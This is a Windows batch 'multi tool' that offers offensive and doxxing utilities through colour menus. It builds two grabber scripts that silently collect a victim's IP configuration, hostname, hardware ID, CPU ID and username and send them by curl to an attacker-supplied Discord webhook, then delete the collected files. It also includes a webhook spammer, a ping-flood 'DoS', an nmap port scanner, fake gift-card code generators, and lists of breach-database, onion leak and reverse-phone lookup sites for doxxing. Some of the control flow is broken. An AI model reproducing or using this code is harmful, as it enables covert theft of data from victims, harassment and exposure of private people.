@echo off
chcp 65001
title Multi Tool-Made By Craz
color 4
:menu
cls
echo           
echo            ██████╗ ███████╗██╗   ██╗██╗██╗         ████████╗ ██████╗  ██████╗ ██╗         ██╗   ██╗ ██╗
echo            ██╔══██╗██╔════╝██║   ██║██║██║         ╚══██╔══╝██╔═══██╗██╔═══██╗██║         ██║   ██║███║
echo            ██║  ██║█████╗  ██║   ██║██║██║            ██║   ██║   ██║██║   ██║██║         ██║   ██║╚██║
echo            ██║  ██║██╔══╝  ╚██╗ ██╔╝██║██║            ██║   ██║   ██║██║   ██║██║         ╚██╗ ██╔╝ ██║
echo            ██████╔╝███████╗ ╚████╔╝ ██║███████╗       ██║   ╚██████╔╝╚██████╔╝███████╗     ╚████╔╝  ██║
echo            ╚═════╝ ╚══════╝  ╚═══╝  ╚═╝╚══════╝       ╚═╝    ╚═════╝  ╚═════╝ ╚══════╝      ╚═══╝   ╚═╝
echo           
echo.                                                                                                                                                                            
echo                                         [96m╔══════════════════════════╗
echo                                         ║[94m(01) [37m= Usernamelookup     [96m║   
echo                                         ║[94m(02) [37m= Namelookup         [96m║  
echo                                         ║[94m(03) [37m= Phone Number Lookup[96m║  
echo                                         ║[94m(04) [37m= Address Lookup     [96m║  
echo                                         ║[94m(05) [37m= Ip lookup          [96m║
echo.                                        ║[94m(06) [37m= Ip logger          [96m║
echo                                         ║[94m(07) [37m= Pc info grabber    [96m║
echo                                         ║[94m(08) [37m= Ip pinger          [96m║ 
echo                                         ║[94m(09) [37m= Gens               [96m║
echo                                         ║[94m(10) [37m= Next commands      [96m║ 
echo                                         [96m╚══════════════════════════╝ 

                                                                                

set /p choice=(ENTER YOUR CHOICE) 

if "%choice%"=="01" (
    call :username_lookup
) else if "%choice%"=="02" (
    call :name_lookup
) else if "%choice%"=="03" (
    call :phone_number_lookup
) else if "%choice%"=="04" (
    call :address_lookup
) else if "%choice%"=="05" (
    call :ipGeoLookup
) else if "%choice%"=="info" (
    cls
    goto :page_2
) else if "%choice%"=="06" (
    call :create_ip_grabber_script
) else if "%choice%"=="07" (
    call :create_pc_info_grabber_script
) else if "%choice%"=="08" (
    call :ipPinger
) else if "%choice%"=="09" (
    call :generatormenu
) else if "%choice%"=="10" (
    call :page 2
    echo Invalid choice. Please try again.
    timeout /t 2 >nul
)

) else (
goto :menu


:create_ip_grabber_script
cls
echo [37m╔══════════════════════════╗
echo ║ [96mIp Grabber Script        [37m║
echo [37m╚══════════════════════════╝
set /p "webhook=Enter your Discord webhook URL: "


if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo Connection (True) Making ip logger script.
timeout /t 5 >nul

echo @echo off > ip_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"ip.txt" %webhook% >> ip_grabber_exec.bat
echo ipconfig ^>ip.txt >> ip_grabber_exec.bat

echo IP grabber script has been created as ip_grabber_exec.bat.
pause
goto menu

:page 2
cls
echo    [94m,.   (   .      )        .      "
echo    [94m  ("     )  )'    ("     )  )'    
echo    [94m    .; )  ' (( (" )    ;(,     (( 
echo    [94m     _"., ,._'_.,)__"., ,._'_.
echo         [94m┌─┐[37m┌─┐[94m┬┌┐┌[37m┌┬┐  [94m┌┬┐[37m┌─┐[94m┌─┐[37m┬  
echo         [94m│ │[37m└─┐[94m││││[37m │   [94m │ [37m│ │[94m│ │[37m│  
echo         [94m└─┘[37m└─┘[94m┴┘└┘[37m ┴   [94m ┴ [37m└─┘[94m└─┘[37m┴─┘                                                                                                                                                                                        
echo        [96m╔══════════════════════════╗
echo        ║[94m(11) [37m= Webhook spammer    [96m║
echo        ║[94m(12) [37m= Website lookup     [96m║  
echo        ║[94m(13) [37m= Dos attack web     [96m║  
echo        ║[94m(14) [37m= Dos attack ip      [96m║  
echo        ║[94m(15) [37m= Webhook info       [96m║
echo.       ║[94m(16) [37m= Remove webhook     [96m║
echo        ║[94m(17) [37m= Pscan              [96m║
echo        ║[94m(18) [37m= Mac addy lookup    [96m║ 
echo        ║[94m(19) [37m= Ip config          [96m║
echo        ║[94m(20) [37m= Next commands      [96m║ 
echo        [96m╚══════════════════════════╝
set /p choice=(!)

if "%choice%"=="11" (
    call :sendMessageViaWebhook
    goto menu
)

if "%choice%"=="12" (
    call :getIPAddressFromWebsite
    goto menu
)



if "%choice%"=="13" (
    call :dos
    goto menu
)

if "%choice%"=="14" (
    call :dos_ip
    goto menu
)

if "%choice%"=="15" (
    call :webhookInfo
    goto menu
)

if "%choice%"=="16" (
    call :removeDiscordWebhook
    goto menu
)


if "%choice%"=="17" (
    call :scanIPRange
    goto menu
)


if "%choice%"=="18" (
    call :macAddressLookup
    goto menu
)

if "%choice%"=="19" (
    ipconfig
)

) else if "%choice%"=="20" (
    call :page 2

:page 3
cls
echo    [94m,.   (   .      )        .      "
echo    [94m  ("     )  )'    ("     )  )'    
echo    [94m    .; )  ' (( (" )    ;(,     (( 
echo    [94m     _"., ,._'_.,)__"., ,._'_.
echo         [94m┌─┐[37m┌─┐[94m┬┌┐┌[37m┌┬┐  [94m┌┬┐[37m┌─┐[94m┌─┐[37m┬  
echo         [94m│ │[37m└─┐[94m││││[37m │   [94m │ [37m│ │[94m│ │[37m│  
echo         [94m└─┘[37m└─┘[94m┴┘└┘[37m ┴   [94m ┴ [37m└─┘[94m└─┘[37m┴─┘                                                                                                                                                                                        
echo        [96m╔══════════════════════════╗
echo        ║[94m(21) [37m= Leaksearch         [96m║
echo        ║[94m(22) [37m=                    [96m║  
echo        ║[94m(23) [37m=                    [96m║  
echo        ║[94m(24) [37m=                    [96m║  
echo        ║[94m(25) [37m=                    [96m║
echo.       ║[94m(26) [37m=                    [96m║
echo        ║[94m(27) [37m=                    [96m║
echo        ║[94m(28) [37m=                    [96m║ 
echo        ║[94m(29) [37m=                    [96m║ 
echo        [96m╚══════════════════════════╝
set /p choice=(!)

if "%choice%"=="22" (
    call :generatePassword
    goto :eof
) else if "%choice%"=="21" (
    call :doxxintools
)

:generatePassword

setlocal EnableDelayedExpansion
set "chars=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789!@#$%^&*()-_=+[]{}|;:,.<>?`~"
set "length=12"
set "password="

for /l %%i in (1,1,%length%) do (
    set /a "charIndex=!random! %% 76"
    for %%A in (!charIndex!) do set "char=!chars:~%%A,1!"
    set "password=!password!!char!"
)

echo Random Password: !password!
pause
goto :eof

:doxxintools
cls
echo [96m╔════════════════════════╗
echo ║     [31m?leaksearch?       [96m║
echo [96m╚════════════════════════╝   
 echo [96mhttps://intelx.io                                           
 echo [96mhttps://leakpeek.com                                        
 echo [96mhttps://leak-lookup.com                                     
 echo [96mhttps://snusbase.com/search                                 
 echo [96mhttps://haveibeenpwned.com                                  
 echo [96mhttps://www.dehashed.com/                                    
 echo [96mhttps://cybernews.com/personal-data-leak-check              
 echo [96mhttps://breachdirectory.com/search                          
 echo [96mhttps://breachdirectory.org                                 
 echo [96mhttps://leakcheck.net                                       
 echo [96mhttps://breachdbsztfykg2fdaq2gnqnxfsbj5d....onion.pet       
 echo [96mhttps://aleph.occrp.org                                     
 echo [96mhttps://checkleaked.cc                                      
 echo [96mhttps://namescan.io/freeemailcompromisedcheck               
 echo [96mhttps://monitor.firefox.com                                 
 echo [96mhttps://www.fasterbroadband.co.uk/tools/...ach-search       
 echo [96mhttps://www.hotsheet.com/inoitsu                            
 echo [96mhttps://checkashleymadison.com                              
 echo [96mhttps://surfshark.com                                       
 echo [96mhttps://tragercop.1password.com                             
 echo [96mhttps://ghostproject.fr                                     
 echo [96mhttps://saverudata.online/ (RussinLeak DB search)           
echo [96m╔════════════════════════╗                                
echo ║     [31m?PhoneSearch?      [96m║                          
echo [96m╚════════════════════════╝                          
echo [96mhttps://www.spydialer.com                         
echo [96mhttps://www.numlookup.com                         
echo [96mhttps://www.truecaller.com                        
echo [96mhttps://www.searchyellowdirectory.com             
echo [96mhttps://demo.phoneinfoga.crvx.fr                  
echo [96mhttps://onlinesim.io                              
echo [96mhttps://www.411.com                               
echo [96mhttps://411.info                                  
echo [96mhttps://www.calleridtest.com                      
echo [96mhttps://thatsthem.com/reverse-phone-lookup        
echo [96mhttp://www.fonefinder.net                         
echo [96mhttps://www.callersmart.com                      
echo [96mhttps://www.phonevalidator.com                   
echo [96mhttps://freecarrierlookup.com                     
echo [96mhttps://www.usphonebook.com                      
echo [96mhttps://pccare99.com                              
echo [96mhttps://www.numberguru.com                        
echo [96mhttps://www.calltruth.com/                        
echo [96mhttps://www.allareacodes.com                      
echo [96mhttps://www.peoplebyphone.com                     
echo [96mhttps://www.confidentialphonelookup.com           

pause
goto menu


:ipconfig_function
ipconfig
pause
goto :eof

:macAddressLookup
cls
echo  ╔══════════════════════════╗
echo  ║  (   .      )  (   .     ║ 
echo  ║   )  ' (( (" )  )  ' ((  ║
echo  ║   _"., ,._'_.,)__"., ,_  ║
echo  ║    MAC Address Lookup    ║
echo  ╚══════════════════════════╝
set /p "ip=Enter the IP address to lookup MAC address: "


for /f "tokens=2" %%i in ('arp -a ^| find "%ip%"') do (
    set "mac=%%i"
)

if not "%mac%"=="" (
    echo MAC address for IP %ip% is: %mac%
) else (
    echo MAC address not found for IP %ip%
)

pause
goto menu


:scanIPRange
cls
echo                                    [96m(   .      )    
echo                                    [96m.; )  ' (( (
echo                                    [96m_"., ,._'_
echo                           [96m; )  ' (╔══════════╗ ; )  ' (
echo                          [96m"., ,._' ║  Pscan   ║ "., ,._'
echo                          [96m╔════════╚══════════╝════════╗ 
echo                          [96m║         Ip Address         [96m║
echo                          [96m╚════════════════════════════╝ 

echo                     .  ; )  ' (( (" )    ;(.; )  ' (( (" ) 
echo                          _"., ,._'_.,)__"., ,_"., ,._'_.,)__
echo                         ┌─┐┌─┐┬─┐┌┬┐  ┌─┐┌─┐┌─┐┌┐┌┌┐┌┌─┐┬─┐
echo                         ├─┘│ │├┬┘ │   └─┐│  ├─┤││││││├┤ ├┬┘
echo                         ┴  └─┘┴└─ ┴   └─┘└─┘┴ ┴┘└┘┘└┘└─┘┴└─
set /p ipRange=


echo %ipRange% | findstr /r /i /c:"^\([0-9]\{1,3\}\.\)\{3\}[0-9]\{1,3\}$" >nul 2>&1
if %errorlevel% equ 0 (
    nmap -p- -T4 -Pn %ipRange%
) else (
    nmap --top-ports 100 -T4 -Pn %ipRange%
)

if %errorlevel% neq 0 (
    echo An error occurred while scanning the IP range. Please check the input and try again.
    pause
    goto scanIPRange
) else (
    pause
    goto menu
)

:removeDiscordWebhook
cls
set /p "webhookURL=Enter the Discord webhook URL to remove: "


echo.%webhookURL%>nul

echo Webhook URL removed successfully.

echo           [96m╔══════════╗
echo           [96m║  [37mRemove  [96m║
echo   [96m╔═══════[96m╚══════════╝════════╗
echo   [96m║         [37mWebhook           [96m║
echo   [96m╚══════╔═════════════╗══════╝
echo [96m╔════════╚═════════════╝═══════════╗
echo [96m║  [92m╔╦╗  [92m╦  [92m╔═╗  [92m╔═╗  [92m╔═╗  [92m╦═╗  [92m╔╦╗ [96m║
echo [96m║  [92m ║║  [92m║  [92m╚═╗  [92m║    [92m║ ║  [92m╠╦╝   [92m║║ [96m║
echo [96m║  [92m═╩╝  [92m╩  [92m╚═╝  [92m╚═╝  [92m╚═╝  [92m╩╚═  [92m═╩╝ [96m║
echo [96m╚══════════════════════════════════╝
pause
exit /b

:dos_ip
echo                [96m...                                
echo              [96m;::::;                              
echo            [96m;::::; :;                              
echo          [96m;:::::'   :;                             
echo         [96m;:::::;     ;.                           
echo        [96m,:::::'       ;           [31m.OOO\           
echo        [96m::::::;       ;          [31m.OOOOO\            
echo        [96m;:::::;       ;         [31m.OOOOOOOO           
echo       [96m,;::::::;     ;'         [91m./ [31mOOOOOOO          
echo     [96m;:::::::::`. ,,,;.        [91m./  [91m/ [31mDOOOOOO        
echo   [96m.';:::::::::::::::::;,     [91m./  [91m/     [31mDOOOO     
echo  [96m,::::::;::::::;;;;::::;,   [91m/  [91m/        [31mDOOO     
echo [96m;`::::::`'::::::;;;::::: ,#[91m/  [91m/          [31mDOOO   
echo [96m:`:::::::`;::::::;;::: ;::#  [91m/            [31mDOOO   
echo [96m::`:::::::`;:::::::: ;::::# [91m/              [31mDOO   
echo [96m`:`:::::::`;:::::: ;::::::#[91m/               [31mDOO
echo  [96m:::`:::::::`;; ;:::::::::##                [31mOO
echo  [96m::::`:::::::`;::::::::;:::#                [31mOO
echo  [96m`:::::`::::::::::::;'`:;::#                [31mO
echo   [96m`:::::`::::::::;' [91m/  [91m/ `:#
echo    [96m::::::`:::::;'  [91m/  [91m/   `#  
echo [96m╔╦╗╔═╗╔═╗  ╔═╗╔╦╗╔╦╗╔═╗╔═╗╦╔═
echo  [96m║║║ ║╚═╗  ╠═╣ ║  ║ ╠═╣║  ╠╩╗
echo [96m═╩╝╚═╝╚═╝  ╩ ╩ ╩  ╩ ╩ ╩╚═╝╩ ╩
set /p ip_address=Enter Local ip address: 
set /p num_requests=Enter the number of requests to send: 
echo Sending %num_requests% requests to %ip_address%!
for /l %%i in (1,1,%num_requests%) do (
    echo Request %%i sent to %ip_address%!
    ping -n 1 %ip_address% > nul
)
timeout /t 5
goto :eof
:webhookInfo
cls
echo                 [94m╔══════════╗
echo                 ║ [94mWebhook  [94m║      
echo      ╔══════════╚══════════╝════════════╗
echo      ║[94mGet info of a discord webhook (!)[94m║
echo      ╚══════════════════════════════════╝
set /p "webhookURL=(!) "

echo Fetching information for the Webhook URL %webhookURL%...
timeout /t 5 >nul

echo Information for the Webhook URL %webhookURL%:
curl -X GET %webhookURL%

pause
goto menu

:getIPAddressFromWebsite
cls
set /p "website=Enter a URL[?] "
echo ╔════════════════════════════════════════╗
echo ║[96m[?]Finding information on %website%   ║
echo ╚════════════════════════════════════════╝
timeout /t 5 >nul
nslookup %website%
pause
exit /b

:sendMessageViaWebhook
set /p webhook=Enter the webhook URL: 
curl --head --silent --fail "%webhook%" >nul 2>&1
if %errorlevel% neq 0 (
echo [96m╔════════════════════════════════════════════════════════════════════════════════╗
echo ║       [31mERROR: Failed to connect to the webhook. The webhook might not be real. [96m ║
echo [96m╚════════════════════════════════════════════════════════════════════════════════╝
  pause
  goto menu
)
set /p message=Enter the message to send: 
set /p count=Enter the number of times to send the message:
echo [96m╔══════════════════════════════╗ 
echo ║[96mConnecting to the webhook     ║
echo [96m╚══════════════════════════════╝
timeout /t 5 >nul
echo.
setlocal enabledelayedexpansion
for /l %%i in (1,1,%count%) do (
  set /a counter=%%i
  <nul set /p "=[?]Connection up. Sending messages"
  curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"!message!\"}" !webhook! >nul 2>&1
  if %errorlevel% neq 0 (
    echo.
    echo Error: Failed to connect to the webhook. The webhook might not be real
    pause
    goto menu
  )
  echo.
)
endlocal
echo [96m╔════════════════════════════════════╗
echo ║        [96mMessages sent               ║
echo [96m╚════════════════════════════════════╝
pause
goto menu

:username_lookup
set /p username=Enter the username you want to lookup: 
 
echo [94m╔═══════════════════════════════════════════════════════════════════════════════════════════════════╗
echo [94m║ .dP"Y8 888888    db    88""Yb  dP""b8 88  88     88""Yb 888888 .dP"Y8 88   88 88     888888 .dP"Y8║
echo [94m║ `Ybo." 88__     dPYb   88__dP dP   `" 88  88     88__dP 88__   `Ybo." 88   88 88       88   `Ybo."║
echo [94m║ o.`Y8b 88""    dP__Yb  88"Yb  Yb      888888     88"Yb  88""   o.`Y8b Y8   8P 88  .o   88   o.`Y8b║
echo [94m║ 8bodP' 888888 dP""""Yb 88  Yb  YboodP 88  88     88  Yb 888888 8bodP' `YbodP' 88ood8   88   8bodP'║
echo [94m╚═══════════════════════════════════════════════════════════════════════════════════════════════════╝ 
echo.
echo                [37m╔════════════════════════════════════════════════════════════
echo                ║[94mTikTok: [37mhttps://www.tiktok.com/@%username%
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mInstagram: [37mhttps://www.instagram.com/%username%             
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mFacebook: [37mhttps://www.facebook.com/%username%               
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mTwitter: [37mhttps://www.twitter.com/%username%                 
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSteam: [37mhttps://steamcommunity.com/id/%username%             
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mYouTube: [37mhttps://www.youtube.com/user/%username%            
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mGitHub: [37mhttps://www.github.com/%username%                   
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mReddit: [37mhttps://www.reddit.com/user/%username%              
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mDiscord: [37mhttps://www.discord.com/%username%                 
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSoundCloud: [37mhttps://soundcloud.com/%username%               
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mTwitch: [37mhttps://www.twitch.tv/%username%                   
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mSnapchat: [37mhttps://www.snapchat.com/add/%username%           
echo                [37m║════════════════════════════════════════════════════════════
echo                ║[94mPinterest: [37mhttps://www.pinterest.com/%username%             
echo                [37m╚════════════════════════════════════════════════════════════
pause
goto :menu

goto :menu

:phone_number_lookup
set /p number=Enter the phone number you want to look up: 

echo Searching for information related to %number%...
echo You can find detailed information at https://www.truepeoplesearch.com/results?phoneno=%number%
echo.
pause
goto :menu

goto :menu

:address_lookup
set /p address=Enter the address you want to look up: 

echo Opening Eniro with search results for %address%...
start https://www.eniro.se/var?q=%address%
echo.
pause
goto :menu

:ipGeoLookup
cls
echo [37m╔═══════════════════════════════╗
echo ║    [94m╦[37m╔═╗  [94m╦  [37m╔═╗[94m╔═╗[37m╦╔═[94m╦ ╦[37m╔═╗[37m   ║
echo ║    [94m║[37m╠═╝  [94m║  [37m║ ║[94m║ ║[37m╠╩╗[94m║ ║[37m╠═╝[37m   ║
echo ║    [94m╩[37m╩    [94m╩═╝[37m╚═╝[94m╚═╝[37m╩ ╩[94m╚═╝[37m╩  [37m   ║
echo [37m╚═══════════════════════════════╝  
set /p "ip=[94mE[37mn[94mt[37me[94mr [37ma[94mn [37mI[94mP [37ma[97m[37md[97md[37mre[97ms[37ms: "             
echo.
curl -s ipinfo.io/%ip% | findstr /R /C:"\"city\":" /C:"\"postal\":" /C:"\"country\":" /C:"\"loc\":" /C:"\"timezone\":"
echo.
echo [94m╚═════════════════════════════════════════════
pause
exit /b


:create_pc_info_grabber_script
cls
echo Creating PC Information Grabber Script...
set /p "webhook=Enter your Discord webhook URL: "


if "%webhook%"=="" (
    echo Discord webhook URL is required.
    pause
    goto menu
)

echo @echo off > pc_info_grabber_exec.bat
echo hostname^>pcname.txt >> pc_info_grabber_exec.bat
echo wmic csproduct get uuid^>hwid.txt >> pc_info_grabber_exec.bat 
echo echo %%username%%^>pcusername.txt >> pc_info_grabber_exec.bat
echo wmic cpu get processorid^>cpuid.txt >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"hwid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"cpuid.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcusername.txt" %webhook% >> pc_info_grabber_exec.bat
echo curl --silent --output /dev/null -F l=@"pcname.txt" %webhook% >> pc_info_grabber_exec.bat
echo del pcname.txt >> pc_info_grabber_exec.bat
echo del hwid.txt >> pc_info_grabber_exec.bat
echo del pcusername.txt >> pc_info_grabber_exec.bat
echo del cpuid.txt >> pc_info_grabber_exec.bat

echo PC information grabber script has been created as pc_info_grabber_exec.bat.
pause
goto menu

:ipPinger
cls
echo           [94m▪  [37m ▄▄▄·    [94m ▄▄▄[37m·▪   ▐ ▄ [94m ▄▄ • [37m▄▄▄ .[94m▄▄▄  
echo           [94m██ [37m▐█ ▄█    [94m▐█ ▄[37m███ •█▌▐█[94m▐█ ▀ ▪[37m▀▄.▀·[94m▀▄ █·
echo           [94m▐█·[37m ██▀·    [94m ██▀[37m·▐█·▐█▐▐▌[94m▄█ ▀█▄[37m▐▀▀▪▄[94m▐▀▀▄ 
echo           [94m▐█▌[37m▐█▪·•    [94m▐█▪·[37m•▐█▌██▐█▌[94m▐█▄▪▐█[37m▐█▄▄▌[94m▐█•█▌
echo           [94m▀▀▀[37m.▀       [94m.▀  [37m ▀▀▀▀▀ █▪[94m·▀▀▀▀ [37m ▀▀▀ [94m.▀  ▀
set /p "ip=Enter ip address: "

ping %ip%
pause
exit /b

:generatormenu
cls

echo                                              [37m╔══════════════════╗
echo                                              ║   [94m╔═╗╔═╗╔╗╔╔═╗   [37m║ 
echo                                              ║   [94m║ ╦║╣ ║║║╚═╗   [37m║
echo                                              ║   [94m╚═╝╚═╝╝╚╝╚═╝   [37m║
echo                                              ║                  ║                                                           
echo. [37m╔═══════════════════════════════════════════╚══════════════════╝═══════════════════════════════════════════════════╗
echo  ║                                                                                                                  ║
echo  ║  [94m!s.=  Steam Code Generator                                           !n.=  Netflix Code Generator               [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!p.=  PlayStation Network Code Generator                             !x.=  Xbox Live Code Generator             [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!r.=  Roblox Code Generator                                          !f.=  Spotify Code Generator               [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!v.=  Fortnite V-Bucks Code Generator                                !d.=  Disney+ Gift Card Generator          [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!e.=  Epic Games Gift Card Generator                                 !t.=  Twitch Prime Code Generator          [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!o.=  Nintendo eShop Code Generator                                  !m.=  Minecraft Gift Code Generator        [37m║
echo  ║══════════════════════════════════════════════════════════════════════════════════════════════════════════════════║
echo  ║  [94m!c.=  VISA/Mastercard Gift Card Generator                            !spam.=  Webhook Spammer                   [37m║                 
echo  ║                                                                                                                  ║
echo. ╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝

set /p gen_choice=Enter your choice:
if "%gen_choice%"=="!s" goto steamgen
if "%gen_choice%"=="!spam" goto messagesender
if "%gen_choice%"=="!exit" goto :eof
if "%gen_choice%"=="!n" goto netflixgen
if "%gen_choice%"=="!p" goto psngen
if "%gen_choice%"=="!x" goto xboxgen
if "%gen_choice%"=="!r" goto robloxgen
if "%gen_choice%"=="!f" goto spotifygen
if "%gen_choice%"=="!v" goto fortnitegen
if "%gen_choice%"=="!d" goto disneyplusgen
if "%gen_choice%"=="!e" goto epicgamesgen
if "%gen_choice%"=="!t" goto twitchprimegen
if "%gen_choice%"=="!o" goto nintendoeshopgen
if "%gen_choice%"=="!m" goto minecraftgen
if "%gen_choice%"=="!c" goto visamastercardgen

:steamgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=15"

set /p "webhook=Enter Discord webhook URL for Steam codes: "

:steamgen_loop
set /p "num_codes=Enter the number of Steam codes to generate (0 to exit): "
if %num_codes% equ 0 goto menu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.steampowered.com/account/registerkey?key=%code%\"}" %webhook%
)

goto steamgen_loop

:netflixgen


goto menu

:psngen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for PlayStation Network codes: "

:psngen_loop
set /p "num_codes=Enter the number of PlayStation Network codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://store.playstation.com/en-us/redeem-code/%code%\"}" %webhook%
)

goto psngen_loop


:xboxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Xbox Live codes: "

:xboxgen_loop
set /p "num_codes=Enter the number of Xbox Live codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 36"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://redeem.microsoft.com/%code%\"}" %webhook%
)

goto xboxgen_loop



:robloxgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Roblox codes: "

:robloxgen_loop
set /p "num_codes=Enter the number of Roblox codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.roblox.com/gamecard/redeem/%code%\"}" %webhook%
)

goto robloxgen_loop



:spotifygen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=10"

set /p "webhook=Enter Discord webhook URL for Spotify codes: "

:spotifygen_loop
set /p "num_codes=Enter the number of Spotify codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.spotify.com/activate/%code%\"}" %webhook%
)

goto spotifygen_loop

:fortnitegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Fortnite V-Bucks codes: "

:fortnitegen_loop
set /p "num_codes=Enter the number of Fortnite V-Bucks codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.fortnite.com/redeem/%code%\"}" %webhook%
)

goto fortnitegen_loop

:disneyplusgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Disney+ Gift Card codes: "

:disneyplusgen_loop
set /p "num_codes=Enter the number of Disney+ Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.disneyplus.com/redeem/%code%\"}" %webhook%
)

goto disneyplusgen_loop

:epicgamesgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Epic Games Gift Card codes: "

:epicgamesgen_loop
set /p "num_codes=Enter the number of Epic Games Gift Card codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.epicgames.com/redeem/%code%\"}" %webhook%
)

goto epicgamesgen_loop

:twitchprimegen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=12"

set /p "webhook=Enter Discord webhook URL for Twitch Prime codes: "

:twitchprimegen_loop
set /p "num_codes=Enter the number of Twitch Prime codes to generate (0 to exit): "
if %num_codes% equ 0 goto generatormenu

for /l %%n in (1,1,%num_codes%) do (
    set "code="
    for /l %%i in (1,1,%length%) do (
        set /a "rand_idx=!random! %% 62"
        for %%j in (!rand_idx!) do set "char=!characters:~%%j,1!"
        set "code=!code!!char!"
    )

    curl -X POST -H "Content-Type: application/json" -d "{\"content\": \"https://www.twitch.tv/redeem/%code%\"}" %webhook%
)

goto twitchprimegen_loop

:nintendoeshopgen
@echo off
setlocal
set "characters=ABCDEFGHIJKLMNOPQRSTUVWXYZabcdefghijklmnopqrstuvwxyz0123456789"
set "length=16"

set /p "webhook=Enter Discord webhook URL for Nintendo eShop codes: "

:nintendoeshopgen_loop
